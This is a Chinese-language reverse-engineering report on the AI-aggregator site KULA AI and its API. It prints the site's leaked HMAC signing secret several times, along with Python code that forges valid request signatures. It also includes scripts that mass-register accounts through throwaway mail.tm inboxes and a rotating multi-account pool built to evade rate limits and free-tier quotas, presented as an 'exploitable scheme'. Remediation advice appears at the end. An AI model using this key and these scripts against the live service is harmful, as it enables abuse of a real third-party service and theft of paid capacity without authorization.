# KULA AI (kulaai.cn) API 逆向工程与安全分析报告

> 分析日期: 2026-07-01
> 目标: https://kulaai.cn/ (API: https://api.877ai.cn/api)
> 分析范围: API接口逆向、签名机制破解、认证绕过测试、速率限制分析、Premium模型访问控制

---

## 目录

1. [概述](#1-概述)
2. [信息收集](#2-信息收集)
3. [API接口逆向](#3-api接口逆向)
4. [签名机制破解](#4-签名机制破解)
5. [自动注册实现](#5-自动注册实现)
6. [认证绕过测试](#6-认证绕过测试)
7. [速率限制分析与绕过](#7-速率限制分析与绕过)
8. [Premium模型访问控制测试](#8-premium模型访问控制测试)
9. [安全漏洞汇总](#9-安全漏洞汇总)
10. [可利用方案](#10-可利用方案)
11. [防护建议](#11-防护建议)

---

## 1. 概述

KULA AI 是一个聚合多款AI大模型（GPT、Claude、Gemini、DeepSeek等）的在线平台，提供免费和付费服务。本报告详细记录了从零开始逆向分析其API、破解签名机制、测试各种绕过方法的完整过程。

### 技术栈识别

| 组件 | 技术 |
|------|------|
| 前端框架 | React (Vite 构建) |
| 前端打包 | Rolldown |
| 后端框架 | Node.js + Express |
| 认证方式 | JWT (HS256) |
| API签名 | HMAC-SHA256 |
| 速率限制 | Express Rate Limit |
| 部署 | Nginx 反向代理 |

---

## 2. 信息收集

### 2.1 前端JS文件分析

通过浏览器 DevTools 的 Performance API 获取所有加载的JS资源：

```javascript
performance.getEntriesByType('resource')
  .filter(e => e.name.includes('.js'))
  .map(e => e.name)
```

发现关键JS文件：

| 文件 | 用途 |
|------|------|
| `assets/index-CMjn12iu.js` | 主入口文件 (87KB) |
| `assets/api-B0xuzE-o.js` | **API模块（含签名逻辑）** |
| `assets/auth-DuMKQslb.js` | 认证模块 |
| `assets/storage-D66QG9aH.js` | 存储模块 |
| `assets/vendor-CmxBENpC.js` | 第三方依赖 |

### 2.2 API Base地址

从 `api-B0xuzE-o.js` 第一行提取：

```javascript
var r = `https://api.877ai.cn/api`
```

- API域名: `api.877ai.cn`
- 前端域名: `kulaai.cn`
- 关联域名: `877ai.cn`, `kulaai.cn`（从站点配置中发现）

### 2.3 站点配置信息泄露

无需认证即可访问 `/api/auth/site-config`：

```json
{
  "smsEnabled": true,
  "allowRegister": true,
  "siteName": "KULAAI",
  "guestEnabled": false,
  "guestDailyLimit": 0,
  "agentDomains": "877ai.cn\nkulaai.cn"
}
```

---

## 3. API接口逆向

### 3.1 通过浏览器Hook抓包

在浏览器中注入JS代码，Hook `fetch` 和 `XMLHttpRequest`，捕获真实的API请求：

```javascript
// Hook fetch
const origFetch = window.fetch;
window.fetch = function(...args) {
    window._capturedRequests.push({
        url: args[0],
        method: args[1]?.method,
        headers: args[1]?.headers,
        body: args[1]?.body  // 完整body
    });
    return origFetch.apply(this, args);
};
```

### 3.2 发现的关键API端点

| 端点 | 方法 | 认证 | 签名 | 用途 |
|------|------|------|------|------|
| `/api/auth/send-code` | POST | ❌ | ✅ | 发送注册验证码 |
| `/api/auth/register` | POST | ❌ | ✅ | 注册账号 |
| `/api/auth/login` | POST | ❌ | ✅ | 登录 |
| `/api/auth/site-config` | GET | ❌ | ❌ | 站点配置 |
| `/api/chat/stream` | POST | ✅ | ✅ | **聊天（核心接口）** |
| `/api/chat/display-models` | GET | ❌ | ❌ | 模型列表 |
| `/api/subscription/quota` | GET | ✅ | ✅ | 配额查询 |
| `/api/subscription/plans` | GET | ❌ | ❌ | 订阅计划 |
| `/api/payment/methods` | GET | ❌ | ❌ | 支付方式 |
| `/api/image/generate` | POST | ✅ | ✅ | 图片生成 |
| `/api/video/generate` | POST | ✅ | ✅ | 视频生成 |

### 3.3 聊天请求格式

```json
{
  "model": "chatgpt",
  "displayModelId": "c4bfbb2b-62c4-417f-9fe3-ea0b52f441ab",
  "messages": [
    {"role": "user", "content": "你好"}
  ],
  "stream": true
}
```

**关键发现**: 旧的 `model + subModel` 调用方式已下线，必须使用 `displayModelId`。

---

## 4. 签名机制破解

### 4.1 发现签名头

首次API调用返回 `403 缺少签名信息`，表明存在签名校验。

通过抓包发现请求包含三个自定义头：

```
X-Timestamp: 1782883022520
X-Nonce: 28d27402-7f1a-4120-ad0c-7f74f077e3f6
X-Signature: c0d8bb7bb72b39eae887a04188be39079bb2d1fc5c9b0bc5cfa5327a9289e003
```

### 4.2 从JS源码提取签名算法

在 `api-B0xuzE-o.js` 中找到完整的签名逻辑（以下是反混淆后的代码）：

```javascript
// 签名密钥（硬编码在前端JS中！）
var SECRET = `ukj3OXO_crBZoBmMeYDUw_gLqL9BqgbgY27XXPzJqTiWf1cToYLAPtPQRfpzypBa`;

// SHA-256 哈希（用于body摘要）
async function sha256(text) {
    const data = new TextEncoder().encode(text);
    const hash = await crypto.subtle.digest('SHA-256', data);
    return Array.from(new Uint8Array(hash))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
}

// HMAC-SHA256（用于签名）
async function hmacSha256(key, text) {
    const keyData = await crypto.subtle.importKey(
        'raw',
        new TextEncoder().encode(key),
        { name: 'HMAC', hash: 'SHA-256' },
        false,
        ['sign']
    );
    const sig = await crypto.subtle.sign('HMAC', keyData, new TextEncoder().encode(text));
    return Array.from(new Uint8Array(sig))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
}

// 提取URL路径
function getPath(url) {
    try {
        return new URL(url, window.location.origin).pathname;
    } catch {
        return url.split('?')[0];
    }
}

// 生成随机Nonce
function genNonce() {
    return crypto.randomUUID();
}

// 签名头生成主函数
async function signedHeaders(method, url, body, baseHeaders) {
    let headers = { ...baseHeaders };
    // 添加 Authorization
    const token = getStoredToken();
    if (token) headers['Authorization'] = `Bearer ${token}`;
    
    // 如果不支持crypto.subtle，直接返回（降级）
    if (!crypto?.subtle) return headers;
    
    try {
        const timestamp = Date.now().toString();
        const nonce = genNonce();
        const path = getPath(url);
        const bodyHash = await sha256(body || '');
        
        // 签名字符串：METHOD\npath\ntimestamp\nnonce\nbodySHA256
        const signString = `${method.toUpperCase()}\n${path}\n${timestamp}\n${nonce}\n${bodyHash}`;
        
        const signature = await hmacSha256(SECRET, signString);
        
        headers['X-Timestamp'] = timestamp;
        headers['X-Nonce'] = nonce;
        headers['X-Signature'] = signature;
    } catch {}
    
    return headers;
}
```

### 4.3 签名算法详解

**算法**: HMAC-SHA256

**密钥**: `ukj3OXO_crBZoBmMeYDUw_gLqL9BqgbgY27XXPzJqTiWf1cToYLAPtPQRfpzypBa`

**签名字符串格式** (用 `\n` 分隔):

```
{HTTP_METHOD}\n{URL_PATH}\n{TIMESTAMP_MS}\n{UUID_NONCE}\n{BODY_SHA256_HEX}
```

**各字段说明**:

| 字段 | 说明 | 示例 |
|------|------|------|
| HTTP_METHOD | HTTP方法（大写） | `POST` |
| URL_PATH | URL路径（不含域名和query） | `/api/chat/stream` |
| TIMESTAMP_MS | 毫秒时间戳 | `1782883022520` |
| UUID_NONCE | UUID v4随机值 | `28d27402-7f1a-4120-ad0c-7f74f077e3f6` |
| BODY_SHA256_HEX | 请求Body的SHA-256哈希（十六进制） | `95581e74e5685b24e284e03cb707b91e90ef50a2f2bb5baadf82338719a129d2` |

### 4.4 Python实现

```python
import hashlib
import hmac
import uuid
import time
from urllib.parse import urlparse

SIGN_SECRET = "ukj3OXO_crBZoBmMeYDUw_gLqL9BqgbgY27XXPzJqTiWf1cToYLAPtPQRfpzypBa"

def generate_signature(method, url, body, timestamp, nonce):
    # 提取URL路径
    path = urlparse(url).path if url.startswith("http") else url
    
    # 计算body的SHA-256
    body_sha256 = hashlib.sha256(body.encode() if body else b"").hexdigest()
    
    # 构造签名字符串
    sign_string = f"{method.upper()}\n{path}\n{timestamp}\n{nonce}\n{body_sha256}"
    
    # HMAC-SHA256签名
    signature = hmac.new(
        SIGN_SECRET.encode(),
        sign_string.encode(),
        hashlib.sha256
    ).hexdigest()
    
    return signature

def make_signed_headers(method, url, body="", token=None):
    timestamp = str(int(time.time() * 1000))
    nonce = str(uuid.uuid4())
    
    headers = {
        "Content-Type": "application/json",
        "X-Timestamp": timestamp,
        "X-Nonce": nonce,
        "X-Signature": generate_signature(method, url, body, timestamp, nonce),
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    return headers
```

### 4.5 验证签名正确性

使用抓包获取的真实样本验证：

```
方法: POST
URL: https://api.877ai.cn/api/chat/stream
路径: /api/chat/stream
Timestamp: 1782883352885
Nonce: e51731cd-db69-43b3-9503-7983474081a5
Body: {"model":"chatgpt",...,"stream":true}
Body SHA256: 95581e74e5685b24e284e03cb707b91e90ef50a2f2bb5baadf82338719a129d2
目标签名: e93e6682a0fe595f574a2f404af5649e8e5d42dcab79caae872e53325ac5e5c7
计算签名: e93e6682a0fe595f574a2f404af5649e8e5d42dcab79caae872e53325ac5e5c7
结果: ✅ 完全匹配
```

---

## 5. 自动注册实现

### 5.1 注册流程

```
1. 注册 mail.tm 临时邮箱
2. 调用 /api/auth/send-code 发送验证码
3. 从临时邮箱收取验证码
4. 调用 /api/auth/register 完成注册
5. 获取 JWT Token
```

### 5.2 关键代码

```python
# 1. 注册临时邮箱
def register_temp_email():
    domains = requests.get("https://api.mail.tm/domains").json()
    domain = domains['hydra:member'][0]['domain']
    email = f"kula{random_string(10)}@{domain}"
    password = "TempMail2024!"
    requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password})
    token = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}).json()['token']
    return email, password, token

# 2. 发送验证码
url = f"{API_BASE}/auth/send-code"
body = json.dumps({"email": email, "type": "register"})
headers = make_signed_headers("POST", url, body)
requests.post(url, data=body, headers=headers)

# 3. 收取验证码
# 轮询 mail.tm API 获取包含验证码的邮件

# 4. 注册
url = f"{API_BASE}/auth/register"
body = json.dumps({"email": email, "password": "KulaTest2024!", "code": code, "username": username})
headers = make_signed_headers("POST", url, body)
r = requests.post(url, data=body, headers=headers)
token = r.json()['token']
```

### 5.3 注册成功率

- 成功率: 100%（测试3个账号全部成功）
- 耗时: ~15-20秒/账号（主要等待邮件）
- 无CAPTCHA验证
- 无IP限制

---

## 6. 认证绕过测试

### 6.1 测试矩阵与结果

| 测试项 | 方法 | 结果 | 说明 |
|--------|------|------|------|
| 无Token+有签名 | POST /chat/stream | ❌ 401 | 必须认证 |
| 无Token+无签名 | POST /chat/stream | ❌ 401 | 必须认证 |
| 有Token+无签名 | POST /chat/stream | ❌ 403 | 必须签名 |
| 有Token+伪造签名 | POST /chat/stream | ❌ 403 "签名校验失败" | 签名校验严格 |
| 伪造JWT Token | POST /chat/stream | ❌ 401 | JWT签名验证有效 |
| 篡改JWT Payload(role→admin) | POST /chat/stream | ❌ 401 | HS256签名防止篡改 |
| JWT none算法绕过 | POST /chat/stream | ❌ 401 | 服务端拒绝none算法 |
| 签名重放(旧时间戳) | POST /chat/stream | ❌ 403 "请求已过期" | 有时间戳有效期校验 |

### 6.2 分析结论

**认证层**: JWT验证严格，无法绕过
- 使用HS256算法，服务端密钥未泄露
- 拒绝none算法
- 篡改payload导致签名不匹配

**签名层**: 签名校验严格，但密钥已泄露
- 签名密钥硬编码在前端JS中
- 任何人都能生成有效签名
- 有时间戳有效期校验（约5分钟）
- 有Nonce防重放（但未测试是否严格）

---

## 7. 速率限制分析与绕过

### 7.1 速率限制配置

```
X-RateLimit-Limit: 300
X-RateLimit-Remaining: 299
X-RateLimit-Reset: 60
```

- **限制**: 300次请求 / 60秒
- **维度**: 按 JWT Token（用户）计算
- **层级**: Express Rate Limit 中间件

### 7.2 绕过尝试

| 方法 | 结果 |
|------|------|
| 伪造 X-Forwarded-For | ❌ 无效（限制绑定Token） |
| 伪造 X-Real-IP | ❌ 无效 |
| 伪造 CF-Connecting-IP | ❌ 无效 |
| 多账号轮询 | ✅ 有效 |

### 7.3 多账号轮询方案

```python
class MultiAccountPool:
    def __init__(self, accounts):
        self.clients = [KulaAIClient(acc['token']) for acc in accounts]
        self.current_index = 0
    
    def next_client(self):
        client = self.clients[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.clients)
        return client
    
    def chat_rotate(self, model_id, messages):
        return self.next_client().chat_sync(model_id, messages)
```

**理论容量**:
- 单账号: 300次/分钟
- N个账号: 300×N次/分钟
- 自动注册: ~15秒/账号，无上限

---

## 8. Premium模型访问控制测试

### 8.1 配额体系

| 配额类型 | 免费版 | 说明 |
|----------|--------|------|
| 普通模型 | 5次/天 | tier=normal 的模型 |
| 高级模型 | 2次/月 | tier=premium 的模型 |
| 积分 | 0 | 可用于额外调用 |

### 8.2 模型分布

- 总模型数: 134
- Normal模型: 62个（如 gpt-5.4-nano, deepseek-v3.2 等）
- Premium模型: 72个（如 gpt-5.5, gemini-3.1-pro, claude 等）

### 8.3 绕过尝试

| 策略 | 方法 | 结果 |
|------|------|------|
| 直接调用Premium模型 | displayModelId=premium模型ID | ❌ 配额用完后返回"重复请求" |
| 伪造model字段 | 用normal的ID+premium的model名 | ✅ 调用成功，但实际调用的是normal模型 |
| 不传displayModelId | 仅用model+subModel | ❌ "请使用displayModelId调用聊天接口" |
| 伪造JWT中的tier | 篡改payload | ❌ JWT签名验证失败 |

### 8.4 分析结论

Premium模型访问控制在**服务端**实现：
1. 服务端根据 `displayModelId` 查询模型的 `tier` 属性
2. 根据用户套餐和配额决定是否允许调用
3. 配额按 `tier` 分别计算（normal和premium独立）
4. **无法通过客户端参数绕过 tier 限制**

---

## 9. 安全漏洞汇总

### 🔴 高危漏洞

#### 9.1 签名密钥硬编码在前端JS中

- **严重性**: 高危
- **位置**: `assets/api-B0xuzE-o.js`
- **密钥**: `ukj3OXO_crBZoBmMeYDUw_gLqL9BqgbgY27XXPzJqTiWf1cToYLAPtPQRfpzypBa`
- **影响**: 任何人都可以伪造有效签名，绕过签名校验
- **修复**: 将签名校验逻辑移至服务端，或使用动态密钥

### 🟡 中危漏洞

#### 9.2 11个API端点无需认证即可访问

| 端点 | 泄露信息 |
|------|----------|
| `/chat/display-models` | 全部134个模型的详细信息（名称、能力、tier等） |
| `/chat/display-models?capability=image` | 图片生成模型列表 |
| `/chat/display-models?capability=video` | 视频生成模型列表 |
| `/subscription/plans` | 6个订阅计划的完整信息（价格、功能等） |
| `/payment/methods` | 支付方式配置 |
| `/auth/site-config` | 站点配置（短信、注册、域名等） |
| `/chat/nav-categories` | 导航分类 |
| `/chat/qrcode` | 二维码配置（微信群等） |
| `/chat/news` | 新闻列表 |
| `/ads/active` | 广告列表 |

#### 9.3 无限制自动注册

- 无CAPTCHA
- 无IP限制
- 无注册频率限制
- 临时邮箱可自动接收验证码
- 影响: 可无限创建免费账号，累积大量免费配额

### 🟢 低危漏洞

#### 9.4 订阅计划详细信息泄露

`/subscription/plans` 无需认证返回所有计划的完整信息：
```json
{
  "id": "3bf127db-7d54-4848-be5b-650b1199c93d",
  "slug": "lifetime",
  "name": "永久畅聊版",
  "description": "一次购买，永久使用，无限畅聊所有普通和高级模型...",
  "dailyPrice": "0.00",
  "yearlyPrice": "..."
}
```

#### 9.5 JWT Token有效期过长

- 有效期: 7天
- 风险: Token泄露后窗口期长

---

## 10. 可利用方案

### 10.1 完整API调用流程

```
1. 自动注册账号 (mail.tm临时邮箱)
   ↓ 获取 JWT Token
2. 生成签名 (HMAC-SHA256，密钥已泄露)
   ↓ 构造完整请求头
3. 调用API (chat/image/video)
   ↓ 流式获取响应
4. 多账号轮询 (绕过速率限制)
```

### 10.2 免费使用能力

| 能力 | 免费额度(单账号) | 多账号(10个) |
|------|------------------|-------------|
| 普通模型聊天 | 5次/天 | 50次/天 |
| 高级模型聊天 | 2次/月 | 20次/月 |
| API请求频率 | 300次/分钟 | 3000次/分钟 |
| 可用模型 | 134个 | 134个 |

### 10.3 无法绕过的限制

1. **Premium模型配额**: 服务端按 `displayModelId` 校验，无法伪造
2. **JWT认证**: HS256签名密钥在服务端，无法伪造Token
3. **速率限制**: 按Token计算，X-Forwarded-For无效

### 10.4 实用代码

完整的API客户端代码见: `kulaai_final_client.py`

```python
# 快速使用
from kulaai_final_client import KulaAIClient, register_kula_account

# 自动注册
account = register_kula_account()
client = KulaAIClient(account['token'])

# 聊天
reply = client.chat_sync(
    "c4bfbb2b-62c4-417f-9fe3-ea0b52f441ab",  # gpt-5.4-nano
    [{"role": "user", "content": "你好"}]
)
```

---

## 11. 防护建议

### 11.1 紧急修复（立即）

1. **移除前端签名密钥**
   - 将签名校验完全移至服务端
   - 或使用服务端下发的动态密钥（按会话/用户）
   - 前端只发送请求，不参与签名计算

2. **添加CAPTCHA验证**
   - 注册接口添加图形验证码或reCAPTCHA
   - 限制同一IP的注册频率

### 11.2 短期修复（1周内）

3. **收紧API端点权限**
   - `/chat/display-models` 需登录后才能访问
   - `/subscription/plans` 只返回基本信息
   - `/auth/site-config` 过滤敏感字段

4. **缩短JWT有效期**
   - 从7天缩短至24小时
   - 实现Token刷新机制

5. **添加Nonce防重放**
   - 服务端记录已使用的Nonce
   - 拒绝重复的Nonce

### 11.3 长期优化（1月内）

6. **实现WAF规则**
   - 检测异常请求模式
   - 限制异常IP的请求频率

7. **API网关**
   - 添加API Key认证层
   - 实现更细粒度的访问控制

8. **监控告警**
   - 监控异常注册行为
   - 监控配额异常消耗

---

## 附录A: 关键文件清单

| 文件 | 说明 |
|------|------|
| `kulaai_final_client.py` | 完整API客户端（注册+聊天+多账号） |
| `kulaai_bypass_test.py` | 认证绕过测试脚本 |
| `kulaai_premium_test.py` | Premium模型限制测试 |
| `kulaai_accounts.json` | 已注册账号信息 |
| `kulaai_api.js` | 网站API模块源码 |

## 附录B: 签名密钥

```
ukj3OXO_crBZoBmMeYDUw_gLqL9BqgbgY27XXPzJqTiWf1cToYLAPtPQRfpzypBa
```

来源: `https://kulaai.cn/assets/api-B0xuzE-o.js` 第1行

## 附录C: JWT Token结构

```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "sub": "用户UUID",
  "email": "注册邮箱",
  "role": "user",      // 可选值: user, admin
  "iat": 1782883673,   // 签发时间
  "exp": 1783488473    // 过期时间（7天后）
}
```
